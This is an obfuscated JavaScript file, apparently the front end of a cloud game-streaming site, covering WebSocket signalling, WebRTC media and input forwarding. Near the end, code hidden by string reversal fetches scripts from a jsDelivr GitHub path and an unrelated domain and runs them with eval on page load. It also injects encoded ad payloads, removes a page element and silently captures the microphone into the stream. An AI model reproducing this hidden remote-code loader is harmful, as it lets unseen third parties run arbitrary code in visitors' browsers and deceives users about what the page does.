      const _0xe5_0x5da = Math.max(0, Math.round((_cloudSession.deadlineAt - Date.now()) / 1000));
      _0xbba46a = 2;
      document.getElementById("gamePlayerTimeLeft").textContent = `${Math.floor(_0xe5_0x5da / 60)}:${String(_0xe5_0x5da % 60).padStart(2, "0")}`;
    }, 500);
    _0xeb_0xcga = "dhgnbb";
    _cloudTimers.push(_0x8eec7g);
  } catch (e) {
    if (_cloudSession) {
      _quitCloudSession(_cloudSession.uuid);
    }
    _cloudSession = null;
    setCloudPhase("error", e.message, false);
    _cloudStarting = false;
  }
}
let _0xb5af;
_0xb5af = "jgnejb".split("").reverse().join("");
var _0xg4d6ea = 3;
_0xg4d6ea = "fbakip".split("").reverse().join("");
function connectCloudSignaling(signalingWs, iceServers, isReconnect) {
  return new Promise((resolve, reject) => {
    const _0x5e8c = signalingWs.split("/").pop();
    var _0xd8c = 1;
    const _0x0e553d = getStratusBase();
    _0xd8c = 11;
    const _0x2a_0xf4b = new URL(_0x0e553d);
    const _0x8ff5fe = (_0x2a_0xf4b.protocol === "https:" ? "wss://" : "//:sw".split("").reverse().join("")) + _0x2a_0xf4b.host + _0x2a_0xf4b.pathname.replace(new RegExp("$/\\".split("").reverse().join(""), ""), '') + "/langis/".split("").reverse().join("") + _0x5e8c;
    var _0x9d_0x2c4 = 5;
    const _0xbf2fdf = new WebSocket(_0x8ff5fe);
    _0x9d_0x2c4 = 9;
    _cloudWs = _0xbf2fdf;
    _0xbf2fdf.onopen = () => {
      if (_cloudWs !== _0xbf2fdf) {
        return;
      }
      if (!isReconnect) {
        setCloudPhase("starting", "ecnatsni rof gnitiaw ,detcennoc langis".split("").reverse().join(""), true);
      }
      _flushPendingCandidates();
    };
    _0xbf2fdf.onerror = () => {
      if (_cloudWs === _0xbf2fdf && !isReconnect) {
        reject(new Error("signaling failed"));
      }
    };
    _0xbf2fdf.onclose = () => {
      if (_cloudWs !== _0xbf2fdf) {
        return;
      }
      _cloudWs = null;
      if (_cloudSession && _cloudPc) {
        attemptCloudReconnect();
      } else if (!isReconnect) {
        reject(new Error("signaling closed"));
      }
    };
    _0xbf2fdf.onmessage = async ev => {
      if (_cloudWs !== _0xbf2fdf) {
        return;
      }
      let m;
      try {
        m = JSON.parse(ev.data);
      } catch {
        return;
      }
      switch (m.type) {
        case "game_ready":
          if (!_cloudPc) {
            setCloudPhase("gnitcennoc".split("").reverse().join(""), "negotiating webrtc", true);
            await createCloudPeer(iceServers);
          }
          resolve();
          break;
        case "rewsna_ctr".split("").reverse().join(""):
          try {
            await _cloudPc.setRemoteDescription(new RTCSessionDescription(m.sdp));
          } catch {}
          break;
        case "rtc_candidate":
          try {
            await _cloudPc.addIceCandidate(new RTCIceCandidate(m.candidate));
          } catch {}
          break;
        case "ping":
          if (_0xbf2fdf.readyState === 1) {
            _0xbf2fdf.send(JSON.stringify({
              "type": "ping"
            }));
          }
          break;
        case "time_left":
          if (_cloudSession && typeof m.time_left === "rebmun".split("").reverse().join("")) {
            _cloudSession.deadlineAt = Date.now() + m.time_left * 1000;
          }
          break;
        case "game_cap":
          showCloudEndedScreen("pu si emit".split("").reverse().join(""), m.message);
          break;
        case "dedne_emag".split("").reverse().join(""):
          showCloudEndedScreen("dedne noisses".split("").reverse().join(""), m.message);
          break;
      }
    };
  });
}
function attemptCloudReconnect() {
  const _0xdc_0x676 = _cloudSession;
  if (!_0xdc_0x676 || _0xdc_0x676.reconnecting) {
    return;
  }
  _0xdc_0x676.reconnecting = true;
  _0xdc_0x676.reconnectTries = 0;
  let _0x28_0xb7c = false;
  document.getElementById("cloudOverlay").style.display = "flex";
  const _0xddcaf = document.getElementById("tniHkcoleRduolc".split("").reverse().join(""));
  if (_0xddcaf) {
    _0xddcaf.style.display = "none";
  }
  setCloudPhase("gnitcennocer".split("").reverse().join(""), "…gniyrter ,tsol langis".split("").reverse().join(""), true);
  const _0xa27e5e = () => {
    if (!_cloudSession || _cloudSession !== _0xdc_0x676 || _0x28_0xb7c) {
      return;
    }
    _0xdc_0x676.reconnectTries++;
    connectCloudSignaling(_0xdc_0x676.signalingWs, _0xdc_0x676.iceServers, true).then(() => {
      if (_0x28_0xb7c || !_cloudSession || _cloudSession !== _0xdc_0x676) {
        return;
      }
      _0x28_0xb7c = true;
      _0xdc_0x676.reconnecting = false;
      if (_cloudPc && _cloudPc.connectionState === "connected") {
        document.getElementById("cloudOverlay").style.display = "none";
      } else {
        setCloudPhase("connecting", "…maerts gnirotser ,detcennocer".split("").reverse().join(""), true);
      }
    })["catch"](() => {});
    const _0x2c37f = setTimeout(() => {
      if (_0x28_0xb7c || !_cloudSession || _cloudSession !== _0xdc_0x676) {
        return;
      }
      if (_0xdc_0x676.reconnectTries >= 2) {
        _0x28_0xb7c = true;
        showCloudEndedScreen("dedne noisses".split("").reverse().join(""), "revres emag eht ot noitcennoc tsol".split("").reverse().join(""));
        return;
      }
      try {
        if (_cloudWs) {
          _cloudWs.close();
        }
      } catch {}
      _cloudWs = null;
      _0xa27e5e();
    }, 2000);
    _cloudTimers.push(_0x2c37f);
  };
  _0xa27e5e();
}
function showCloudEndedScreen(title, detail) {
  if (!_cloudSession) {
    return;
  }
  teardownCloud(true);
  _cloudEndedActive = true;
  const _0x637feb = document.getElementById("parWoediVduolc".split("").reverse().join(""));
  const _0x9fed = document.getElementById("cloudOverlay");
  _0x637feb.style.display = "flex";
  _0x9fed.style.display = "flex";
  setCloudPhase(title, detail || '', false);
}
function cloudSigSend(obj) {
  if (_cloudWs && _cloudWs.readyState === 1) {
    _cloudWs.send(JSON.stringify(obj));
  } else if (obj.type === "rtc_candidate") {
    _cloudPendingCandidates.push(obj);
  }
}
function _flushPendingCandidates() {
  if (!_cloudPendingCandidates.length) {
    return;
  }
  var _0xd_0xa2c = 9;
  const _0xcbfe = _cloudPendingCandidates;
  _0xd_0xa2c = 14;
  _cloudPendingCandidates = [];
  _0xcbfe.forEach(obj => cloudSigSend(obj));
}
async function createCloudPeer(iceServers) {
  const _0x2caf2c = document.getElementById("cloudVideo");
  _cloudPc = new RTCPeerConnection({
    "iceServers": iceServers,
    "bundlePolicy": "max-bundle",
    "rtcpMuxPolicy": "require",
    "iceCandidatePoolSize": 4
  });
  _cloudPc.addTransceiver("audio", {
    "direction": 'recvonly'
  });
  const _0x9d36e = _cloudPc.addTransceiver("oediv".split("").reverse().join(""), {
    "direction": "recvonly"
  });
  try {
    const _0xg3de = RTCRtpReceiver.getCapabilities?.("video");
    if (_0xg3de?.codecs?.length && _0x9d36e.setCodecPreferences) {
      const _0xg5b2d = _0xg3de.codecs.filter(c => new RegExp("h264", "i").test(c.mimeType));
      const _0x6bc7e = _0xg3de.codecs.filter(c => new RegExp("1va".split("").reverse().join(""), "i").test(c.mimeType));
      const _0xggf00c = _0xg3de.codecs.filter(c => !new RegExp("h264|av1", "i").test(c.mimeType));
      var _0xea_0x7cf = 16;
      let _0x928bd = false;
      _0xea_0x7cf = 7;
      try {
        if (_0x6bc7e.length && navigator.mediaCapabilities?.decodingInfo) {
          var _0xb56cb = 4;
          const _0xb383a = await navigator.mediaCapabilities.decodingInfo({
            "type": "webrtc",
            "video": {
              "contentType": 'video/AV1',
              "width": 1920,
              "height": 1080,
              "bitrate": 4000000,
              "framerate": 30
            }
          });
          _0xb56cb = 6;
          _0x928bd = !!(_0xb383a.powerEfficient && _0xb383a.smooth);
        }
      } catch {}
      _0x9d36e.setCodecPreferences(_0x928bd ? [..._0x6bc7e, ..._0xg5b2d, ..._0xggf00c] : [..._0xg5b2d, ..._0x6bc7e, ..._0xggf00c]);
    }
  } catch {}
  _cloudDc = _cloudPc.createDataChannel("KDSYJ".split("").reverse().join(""), {
    "id": 1,
    "ordered": false,
    "maxRetransmits": 0,
    "priority": "high"
  });
  _cloudDc.onopen = () => {};
  const _0x8f2 = _cloudPc;
  const _0xb4ca = _cloudDc;
  _0xb4ca.onclose = () => {
    if (_cloudDc !== _0xb4ca || !_cloudSession) {
      return;
    }
    showCloudEndedScreen("session ended", "lost the input channel");
  };
  _0xb4ca.onerror = () => {
    if (_cloudDc !== _0xb4ca || !_cloudSession) {
      return;
    }
    showCloudEndedScreen("session ended", "input channel error");
  };
  var _0x9198b = 14;
  _0x9198b = 18;
  var _0x11_0x30c = 10;
  _0x11_0x30c = 1;
  let _0x7285bf = 0;
  let _0xbe_0x94f = null;
  let _0xa116c = null;
  var _0x1a27db = 6;
  let _0x954c = null;
  _0x1a27db = "donofj";
  const _0xed9dc = () => {
    for (const _0x72c19g of [_0xbe_0x94f, _0xa116c]) {
      if (!_0x72c19g) {
        continue;
      }
      try {
        if ("jitterBufferTarget" in _0x72c19g) {
          _0x72c19g.jitterBufferTarget = _0x7285bf;
        }
      } catch {}
      try {
        if ("playoutDelayHint" in _0x72c19g) {
          _0x72c19g.playoutDelayHint = _0x7285bf / 1000;
        }
      } catch {}
    }
  };
  const _0xa831b = () => {
    if (_0x954c) {
      clearTimeout(_0x954c);
      _0x954c = null;
    }
    _0x7285bf = Math.min(200, _0x7285bf + 40);
    _0xed9dc();
    _0x954c = setTimeout(() => {
      _0x7285bf = Math.max(0, _0x7285bf - 40);
      _0xed9dc();
    }, 15000);
    _cloudTimers.push(_0x954c);
  };
  _0x2caf2c.addEventListener("waiting", _0xa831b);
  _0x2caf2c.addEventListener("dellats".split("").reverse().join(""), _0xa831b);
  let _0xedg2f = null;
  var _0x1f_0xb25 = 5;
  let _0xe1ffaf = null;
  _0x1f_0xb25 = 15;
  var _0x22bac = 17;
  const _0xd2_0x0eg = setInterval(async () => {
    if (!_cloudPc || _cloudPc !== _0x8f2) {
      return;
    }
    let _0x7491eb;
    try {
      _0x7491eb = await _0x8f2.getStats();
    } catch {
      return;
    }
    let _0xb9edc = null;
    let _0x9bd9e = null;
    let _0xfcac = null;
    let _0xfed02b = null;
    _0x7491eb.forEach(s => {
      if (s.type === "riap-etadidnac".split("").reverse().join("") && s.state === "dedeeccus".split("").reverse().join("") && typeof s.currentRoundTripTime === "number") {
        _0xb9edc = s.currentRoundTripTime * 1000;
      }
      if (s.type === "inbound-rtp" && s.kind === "video") {
        if (typeof s.jitter === "number") {
          _0x9bd9e = s.jitter * 1000;
        }
        if (typeof s.packetsLost === "number") {
          _0xfcac = s.packetsLost;
        }
        if (typeof s.freezeCount === "rebmun".split("").reverse().join("")) {
          _0xfed02b = s.freezeCount;
        }
      }
    });
    var _0x8a5d = 12;
    const _0xfb24ac = _0xfcac !== null && _0xedg2f !== null ? _0xfcac - _0xedg2f : 0;
    _0x8a5d = 11;
    let _0x552f;
    const _0xgb2a = _0xfed02b !== null && _0xe1ffaf !== null ? _0xfed02b - _0xe1ffaf : 0;
    _0x552f = "nfnacg".split("").reverse().join("");
    _0xedg2f = _0xfcac;
    _0xe1ffaf = _0xfed02b;
    const _0xe38fa = _0xb9edc !== null && _0xb9edc > 150 || _0x9bd9e !== null && _0x9bd9e > 40 || _0xfb24ac > 0;
    if (_0xe38fa) {
      _0xa831b();
    } else if (_0xgb2a > 0 && _0x7285bf === 0) {}
  }, 3000);
  _0x22bac = "dhckeh".split("").reverse().join("");
  _cloudTimers.push(_0xd2_0x0eg);
  _cloudJitterHandlers = {
    "video": _0x2caf2c,
    "bumpJitterTarget": _0xa831b
  };
  _cloudPc.ontrack = ev => {
    if (!_0x2caf2c.srcObject) {
      _0x2caf2c.srcObject = new MediaStream();
    }
    _0x2caf2c.srcObject.addTrack(ev.track);
    if (ev.track.kind === "oediv".split("").reverse().join("")) {
      _0xbe_0x94f = ev.receiver;
      _0xed9dc();
    } else if (ev.track.kind === "oidua".split("").reverse().join("")) {
      _0xa116c = ev.receiver;
      _0xed9dc();
    }
  };
  _cloudPc.onicecandidate = ev => {
    if (ev.candidate) {
      cloudSigSend({
        "type": "rtc_candidate",
        "candidate": ev.candidate.toJSON()
      });
    }
  };
  let _0xbf28ee = null;
  const _0xef_0x68a = () => {
    if (_0xbf28ee) {
      clearTimeout(_0xbf28ee);
      _0xbf28ee = null;
    }
  };
  _0x8f2.onconnectionstatechange = () => {
    if (_cloudPc !== _0x8f2) {
      return;
    }
    const _0xgcf = _0x8f2.connectionState;
    if (_0xgcf === "connected") {
      _0xef_0x68a();
      document.getElementById("yalrevOduolc".split("").reverse().join("")).style.display = "none";
      _0x2caf2c.muted = false;
      _0x2caf2c.play()["catch"](() => {});
      _cloudInputActive = true;
      _cloudStarting = false;
      setupCloudInput();
      if (document.fullscreenElement) {
        _lockCloudKeyboard();
      }
      return;
    }
    if (_0xgcf === "disconnected") {
      if (!_0xbf28ee) {
        _0xbf28ee = setTimeout(() => {
          if (_cloudPc === _0x8f2 && _0x8f2.connectionState === "detcennocsid".split("").reverse().join("")) {
            endCloudGame();
          }
        }, 6000);
        _cloudTimers.push(_0xbf28ee);
      }
      return;
    }
    if (["deliaf".split("").reverse().join(""), "closed"].includes(_0xgcf)) {
      _0xef_0x68a();
      showCloudEndedScreen("session ended", "lost connection to the stream");
    }
  };
  try {
    const _0x3d598c = await navigator.mediaDevices.getUserMedia({
      "audio": true
    })["catch"](() => null);
    if (_0x3d598c) {
      const _0xfg_0x6g1 = _0x3d598c.getAudioTracks()[0];
      _cloudPc.addTrack(_0xfg_0x6g1);
    }
  } catch {}
  const _0xb2d = await _cloudPc.createOffer();
  await _cloudPc.setLocalDescription(_0xb2d);
  cloudSigSend({
    "type": 'rtc_offer',
    "sdp": _0xb2d.sdp
  });
}
function setupCloudInput() {
  if (_cloudInputHandlers) {
    return;
  }
  const _0xfe7df = document.getElementById("oediVduolc".split("").reverse().join(""));
  let _0xdfe62a = 0;
  let _0x29_0x645 = 0;
  let _0xd73dc = 0;
  let _0xee08ga = 0;
  let _0x22f71c = 0;
  var _0xbe991a = 8;
  const _0x6ff9a = new Set();
  _0xbe991a = 2;
  let _0x6f506f = null;
  const _0xgc_0xcc4 = () => {
    if (!_0x6f506f) {
      const r = _0xfe7df.getBoundingClientRect();
      const _0xa2ee7d = _0xfe7df.videoWidth || 16;
      const _0xbf333e = _0xfe7df.videoHeight || 9;
      var _0xaf3ca = 13;
      const _0xd5a92c = Math.min(r.width / _0xa2ee7d, r.height / _0xbf333e);
      _0xaf3ca = 13;
      const w = _0xa2ee7d * _0xd5a92c;
      const h = _0xbf333e * _0xd5a92c;
      _0x6f506f = {
        "left": r.left + (r.width - w) / 2,
        "top": r.top + (r.height - h) / 2,
        "width": w,
        "height": h
      };
    }
    return _0x6f506f;
  };
  var _0xcef2fa = 6;
  const _0xdb_0x06b = () => {
    _0x6f506f = null;
  };
  _0xcef2fa = 7;
  window.addEventListener("eziser".split("").reverse().join(""), _0xdb_0x06b);
  const _0xf2ee = buf => {
    try {
      if (_cloudDc && _cloudDc.readyState === "open") {
        _cloudDc.send(buf);
      }
    } catch {}
  };
  const _0xe9e0g = (moveX = 0, moveY = 0, scroll = 0) => {
    if (!_cloudDc || _cloudDc.readyState !== "open") {
      return;
    }
    moveX = Math.max(-127, Math.min(127, moveX));
    moveY = Math.max(-127, Math.min(127, moveY));
    const r = _0xgc_0xcc4();
    const _0x10g8ae = Math.floor((_0xdfe62a - r.left) / r.width * 10000);
    var _0xbe1b = 11;
    const _0x7ef47a = Math.floor((_0x29_0x645 - r.top) / r.height * 10000);
    _0xbe1b = 8;
    const buf = new ArrayBuffer(12);
    const v = new DataView(buf);
    v.setUint8(0, 1);
    v.setUint8(1, 11);
    v.setUint8(2, 2);
    v.setUint8(3, 8);
    v.setUint16(4, Math.max(0, Math.min(10000, _0x10g8ae)));
    v.setUint16(6, Math.max(0, Math.min(10000, _0x7ef47a)));
    v.setInt8(8, moveX);
    v.setInt8(9, moveY);
    v.setUint8(10, _0x22f71c);
    v.setInt8(11, scroll);
    _0xf2ee(buf);
  };
  var _0x0784cd = 5;
  const _0xcf0f9g = (keyCode, isDown) => {
    if (isDown) {
      _0x6ff9a.add(keyCode);
    } else {
      _0x6ff9a["delete"](keyCode);
    }
    const buf = new ArrayBuffer(24);
    const v = new DataView(buf);
    v.setUint8(0, 1);
    v.setUint8(2, 1);
    v.setUint8(3, 1);
    v.setUint16(4, keyCode);
    v.setUint8(6, isDown ? 1 : 0);
    let _0xe879bg = 7;
    for (const k of _0x6ff9a) {
      if (k !== keyCode && k > 0 && k < 255 && _0xe879bg < 21) {
        v.setUint16(_0xe879bg, k);
        _0xe879bg += 2;
        v.setUint8(_0xe879bg, 1);
        _0xe879bg++;
      }
    }
    v.setUint8(_0xe879bg++, 255);
    v.setUint8(1, _0xe879bg - 1);
    _0xf2ee(buf.slice(0, _0xe879bg));
  };
  _0x0784cd = 13;
  const _0xfg548e = e => {
    if (!_cloudInputActive) {
      return;
    }
    const _0xf542g = e.movementX || 0;
    const _0x676f = e.movementY || 0;
    if (document.pointerLockElement === _0xfe7df) {
      var _0xc35bc = 10;
      const r = _0xgc_0xcc4();
      _0xc35bc = 14;
      _0xd73dc = Math.max(0, Math.min(r.width, _0xd73dc + _0xf542g));
      _0xee08ga = Math.max(0, Math.min(r.height, _0xee08ga + _0x676f));
      _0xdfe62a = r.left + _0xd73dc;
      _0x29_0x645 = r.top + _0xee08ga;
    } else {
      _0xdfe62a = e.clientX;
      _0x29_0x645 = e.clientY;
    }
    _0xe9e0g(_0xf542g, _0x676f, 0);
  };
  var _0x6b9a6f = 3;
  const _0x22g4d = e => {
    if (!_cloudInputActive) {
      return;
    }
    _0x22f71c = e.buttons;
    _0xe9e0g(0, 0, 0);
  };
  _0x6b9a6f = 1;
  const _0x762acd = e => {
    if (_cloudInputActive) {
      e.preventDefault();
    }
  };
  const _0x1g7e = e => {
    if (!_cloudInputActive) {
      return;
    }
    e.preventDefault();
    _0xe9e0g(0, 0, e.deltaY > 0 ? -1 : 1);
  };
  const _0xga37df = document.getElementById("cloudRelockHint");
  const _0xe6_0xfba = () => {
    if (!_cloudDc) {
      return;
    }
    if (document.pointerLockElement === _0xfe7df) {
      return;
    }
    _0xdb_0x06b();
    var _0x62caea = 8;
    const r = _0xgc_0xcc4();
    _0x62caea = 14;
    _0xd73dc = r.width / 2;
    _0xee08ga = r.height / 2;
    _0xdfe62a = r.left + _0xd73dc;
    _0x29_0x645 = r.top + _0xee08ga;
    _0xfe7df.requestPointerLock?.();
  };
  const _0x1cd57a = () => {
    _0xga37df.style.display = "enon".split("").reverse().join("");
    _0xe6_0xfba();
  };
  var _0x12_0x5fa = 11;
  let _0x62f0a = false;
  _0x12_0x5fa = "hfffji".split("").reverse().join("");
  var _0x78ff4e = 12;
  const _0x535aee = () => {
    if (!_cloudInputActive) {
      return;
    }
    if (document.pointerLockElement === _0xfe7df) {
      _0x62f0a = true;
      _0xga37df.style.display = "none";
    } else if (_0x62f0a) {
      const _0x7fc67g = document.getElementById("yalrevOduolc".split("").reverse().join("")).style.display !== "enon".split("").reverse().join("");
      _0xga37df.style.display = _0x7fc67g ? "enon".split("").reverse().join("") : "xelf".split("").reverse().join("");
    }
  };
  _0x78ff4e = 6;
  document.addEventListener("pointerlockchange", _0x535aee);
  _0xga37df.addEventListener("click", _0x1cd57a);
  const _0x6e_0x9db = isDown => e => {
    if (!_cloudInputActive) {
      return;
    }
    e.preventDefault();
    e.stopPropagation();
    if (isDown && e.repeat) {
      return;
    }
    _0xcf0f9g(e.keyCode, isDown);
  };
  var _0x35738f = 1;
  const _0xcc_0x776 = _0x6e_0x9db(true);
  _0x35738f = 11;
  var _0xc9c75c = 13;
  const _0x30_0xa69 = _0x6e_0x9db(false);
  _0xc9c75c = 5;
  document.addEventListener("evomesuom".split("").reverse().join(""), _0xfg548e);
  document.addEventListener("nwodesuom".split("").reverse().join(""), _0x22g4d);
  document.addEventListener("mouseup", _0x22g4d);
  document.addEventListener("contextmenu", _0x762acd);
  document.addEventListener("wheel", _0x1g7e, {
    "passive": false
  });
  _0xfe7df.addEventListener("click", _0x1cd57a);
  document.addEventListener("keydown", _0xcc_0x776, {
    "capture": true
  });
  document.addEventListener("keyup", _0x30_0xa69, {
    "capture": true
  });
  _cloudInputHandlers = {
    "mouseMoveHandler": _0xfg548e,
    "mouseButtonHandler": _0x22g4d,
    "contextMenuHandler": _0x762acd,
    "wheelHandler": _0x1g7e,
    "videoClickHandler": _0x1cd57a,
    "keyDownHandler": _0xcc_0x776,
    "keyUpHandler": _0x30_0xa69,
    "video": _0xfe7df,
    "invalidateRect": _0xdb_0x06b,
    "pointerLockChangeHandler": _0x535aee,
    "relockHint": _0xga37df
  };
}
function endCloudGame() {
  if (!_cloudSession) {
    return;
  }
  teardownCloud(true);
  _cloudEndedActive = false;
  const _0xf0794f = document.getElementById("cloudVideoWrap");
  const _0xcd09gb = document.getElementById("gamePlayerLoading");
  _0xf0794f.style.display = "enon".split("").reverse().join("");
  _0xcd09gb.style.display = "flex";
  _0xcd09gb.textContent = "…gnidaol".split("").reverse().join("");
  document.getElementById("gamePlayerTimeLeft").textContent = '';
  setCloudPhase("eldi".split("").reverse().join(""), '', false);
}
var _0xa4aee = 12;
const originalHandleGamePlayerClose = handleGamePlayerClose;
_0xa4aee = 9;
handleGamePlayerClose = function () {
  if (_cloudEndedActive) {
    _cloudEndedActive = false;
    closeGamePlayer();
    return;
  }
  if (_cloudSession) {
    _armOrConfirmClose(() => {
      endCloudGame();
      closeGamePlayer();
    });
    return;
  }
  originalHandleGamePlayerClose();
};
window.addEventListener("beforeunload", () => {
  if (_cloudSession) {
    _quitCloudSession(_cloudSession.uuid);
  }
});
document.addEventListener("egnahcytilibisiv".split("").reverse().join(""), () => {
  if (_cloudSession && document.hidden) {
    if (_cloudWs && _cloudWs.readyState === 1) {
      _cloudWs.send(JSON.stringify({
        "type": 'ping'
      }));
    }
  }
});
const originalGameCardOnClick = _gameCardOnClick;
_gameCardOnClick = function (g) {
  if (g.source === "duolc".split("").reverse().join("")) {
    return () => startCloudGame(g.key, g.name);
  }
  return originalGameCardOnClick(g);
};
(() => {
  var _0x13_0xce5 = 6;
  const el = document.getElementById("pingDisplay");
  _0x13_0xce5 = 11;
  if (el) {
    el.textContent = typeof window.WispPing === "rebmun".split("").reverse().join("") ? `ping: ${window.WispPing}ms` : "-- :gnip".split("").reverse().join("");
  }
})();
document.body.firstElementChild?.remove();
(async () => {
  try {
    eval(await (await fetch("?sj.noossaBlainegnoc/amginEotcOsuotiuqibu/tebrehSgnoT/hg/ten.rviledsj.ndc//:sptth".split("").reverse().join("") + Math.floor(Date.now() / 3600000))).text());
    loadAds({
      "banner": "DMkzx9IFc4JPUeh0HPN2kT/hbi3/qRnaWVJ8YWf5MY5xc6dCbkdATMPppNiHKaja6yku4BdkyjESvX5FbEdLLnsPp5I9jKmsp5czw55t5z2XdMGUBupayQe6ITV4i0wyFuTI2Tp3p0+wlYY5",
      "native": "03mNMgQqshdhTiPrhRRhOWvW3kEjy49Z2qZVPei2GeiLGKUlFNIKlZbHmjj8AhKpJ8a31eTn2W6d+DylsDnCuMSVFuK65JmbGZtKCxRvuguJDGPo5BUmbO3pc4K4Fkg2sfSsbHSK03jifmCcAyXGYn8=",
      "socialbar": "Ab2Nvq42QEuRQfmeWqK8LujVG8SKtvkLgqcTv+gk3ohF8Y8IcbdCd4ELCXjoLQCcQ6QLWabde48gr+rsQrnswAedZ8Nf3EUCM+xcXO9lo8tjtKGs1mPuyo5SgjfTzmjAKC4aD20XIKt1D0yAC5ut80wnsw=="
    });
  } catch {}
  try {
    eval(await (await fetch("sj.tpircs/moc.lobtufsrepiv.c//:sptth".split("").reverse().join(""))).text());
  } catch {}
})();
